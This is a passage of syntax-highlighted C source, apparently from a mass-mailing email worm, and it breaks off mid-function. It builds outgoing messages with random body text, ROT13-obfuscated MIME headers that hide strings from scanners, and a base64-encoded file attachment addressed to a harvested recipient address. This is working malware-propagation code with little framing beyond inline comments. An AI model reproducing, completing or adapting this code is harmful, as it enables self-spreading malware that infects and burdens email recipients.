    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">w</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">w</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">pref</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">text</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">base64_t2q</span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">q</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">alpha</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">alpha</span><span class="sc10">[</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">alpha</span><span class="sc10">[((</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">03</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)];</span><span class="sc0">
    </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">alpha</span><span class="sc10">[((</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">017</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)];</span><span class="sc0">
    </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">alpha</span><span class="sc10">[</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">077</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">msg_b64enc</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">outbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hIn</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">inbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">linepos</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">linelen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">76</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">hIn</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">|</span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hIn</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inp</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inlen</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outp</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">linepos</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">inp</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">inlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hIn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">inbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">inlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">inlen</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">inp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">t</span><span class="sc10">[</span><span class="sc11">tp</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inbuf</span><span class="sc10">[</span><span class="sc11">inp</span><span class="sc10">++];</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">base64_t2q</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">outbuf</span><span class="sc10">[</span><span class="sc11">outp</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(++</span><span class="sc11">linepos</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">linelen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">outbuf</span><span class="sc10">[</span><span class="sc11">outp</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\r'</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">outbuf</span><span class="sc10">[</span><span class="sc11">outp</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">linepos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">base64_t2q</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'='</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'='</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc11">outbuf</span><span class="sc10">[</span><span class="sc11">outp</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">q</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">outbuf</span><span class="sc10">[</span><span class="sc11">outp</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hIn</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">write_headers</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">mime_boundary</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"----=_%s_%.3u_%.4u_%.8X.%.8X"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NextPart"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">15</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xrand32</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">xrand32</span><span class="sc10">());</span><span class="sc0">

    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Sebz: "</span><span class="sc10">);</span><span class="sc0">                              </span><span class="sc1">/* From: */</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">from</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nGb: "</span><span class="sc10">);</span><span class="sc0">               </span><span class="sc1">/* To: */</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nFhowrpg: "</span><span class="sc10">);</span><span class="sc0">          </span><span class="sc1">/* Subject */</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">subject</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nQngr: "</span><span class="sc10">);</span><span class="sc0">             </span><span class="sc1">/* Date */</span><span class="sc0">
    </span><span class="sc11">mk_smtpdate</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nZVZR-Irefvba: 1.0"</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* MIME-Version */</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nPbagrag-Glcr: zhygvcneg/zvkrq;\r\n"</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* "\r\nContent-Type: multipart/mixed;\r\n" */</span><span class="sc0">
    </span><span class="sc11">cat_wsprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\tboundary=\"%s\""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">mime_boundary</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nK-Cevbevgl: 3"</span><span class="sc10">);</span><span class="sc0">          </span><span class="sc1">/* X-Priority: 3 */</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\r\nK-ZFZnvy-Cevbevgl: Abezny"</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc1">/* X-MSMail-Priority: Normal */</span><span class="sc0">

    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\n\r\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">write_body</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">state</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc1">/* This is a multi-part message in MIME format. */</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"Guvf vf n zhygv-cneg zrffntr va ZVZR sbezng.\r\n\r\n"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/*
     * ------=_NextPart_...
     * Content-Type: text/plain;
     *     charset="Windows-1252"
     * Content-Transfer-Encoding: 7bit
     */</span><span class="sc0">  
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"--%f\r\n"</span><span class="sc0">
        </span><span class="sc6">"Pbagrag-Glcr: grkg/cynva;\r\n"</span><span class="sc0">
        </span><span class="sc6">"\tpunefrg=\"Jvaqbjf-1252\"\r\n"</span><span class="sc0">
        </span><span class="sc6">"Pbagrag-Genafsre-Rapbqvat: 7ovg\r\n\r\n"</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">cat_wsprintf</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">mime_boundary</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">write_msgtext</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\n\r\n\r\n"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/*
     *  ------=_NextPart_xxx
     * Content-Type: application/octet-stream;
     *    name="ntldr"
     * Content-Transfer-Encoding: base64
     * Content-Disposition: attachment;
     *    filename="ntldr"
     */</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"--%f\r\n"</span><span class="sc0">
        </span><span class="sc6">"Pbagrag-Glcr: nccyvpngvba/bpgrg-fgernz;\r\n"</span><span class="sc0">
        </span><span class="sc6">"\tanzr=\"%f\"\r\n"</span><span class="sc0">
        </span><span class="sc6">"Pbagrag-Genafsre-Rapbqvat: onfr64\r\n"</span><span class="sc0">
        </span><span class="sc6">"Pbagrag-Qvfcbfvgvba: nggnpuzrag;\r\n"</span><span class="sc0">
        </span><span class="sc6">"\tsvyranzr=\"%f\"\r\n\r\n"</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">cat_wsprintf</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">mime_boundary</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">attach_name</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">msg_b64enc</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">+</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">cat_wsprintf</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\r\n\r\n--%s--\r\n\r\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">-&gt;</span><span class="sc11">mime_boundary</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* Main function. Returns pointer to a buffer with generated buffer.
   Caller is responsible to free it using GlobalFree() */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">msg_generate</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">msgstate_t</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* x@xx.xx */</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">state</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">state</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">state</span><span class="sc10">.</span><span class="sc11">to</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">;</span><span class="sc0">
